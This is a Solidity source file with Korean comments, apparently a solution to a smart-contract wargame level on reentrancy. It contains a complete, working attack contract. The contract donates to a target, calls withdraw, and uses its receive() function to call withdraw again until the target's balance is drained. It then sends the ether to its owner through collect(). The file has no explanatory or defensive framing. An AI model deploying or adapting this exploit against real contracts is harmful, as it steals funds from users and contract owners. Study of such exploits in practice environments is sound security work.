// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}

contract ReEntrancyAttack {
    IReentrance public target;
    address public owner;
    uint256 public amount;

    constructor(address _target) {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        amount = msg.value;

        // 1. attack 컨트랙트로 도네이트
        target.donate{value: msg.value}(address(this)); 

        // 2. 바로 withdraw 실행
        target.withdraw(amount);
    }

    // 5. ether 를 받아서 receive 함수 실행
    receive() external payable {
        uint bal = target.balanceOf(address(this)); // 6. target 에 남아있는 금액 체크
        if(bal > 0) {
            // 7. 작은 단위로 설정 (revert 방지)
            uint256 withdrawAmount = bal < amount ? bal : amount;
            // 8. 다시 withdraw 실행
            target.withdraw(withdrawAmount);
        }
    }

    // 회수용 함수
    function collect() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}
